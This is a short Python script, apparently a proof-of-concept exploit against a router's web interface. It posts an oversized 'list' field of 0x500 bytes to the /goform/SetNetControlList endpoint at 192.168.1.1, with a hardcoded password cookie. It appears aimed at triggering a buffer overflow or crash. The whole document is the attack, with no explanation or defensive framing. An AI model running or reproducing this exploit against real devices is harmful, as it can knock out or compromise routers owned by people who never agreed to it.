import requests
def send_payload(url, payload):
    params={
            'list':payload}
    cookie={'password':'gfytgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500+b'\n'
url="http://192.168.1.1/goform/SetNetControlList"
send_payload(url, payload)   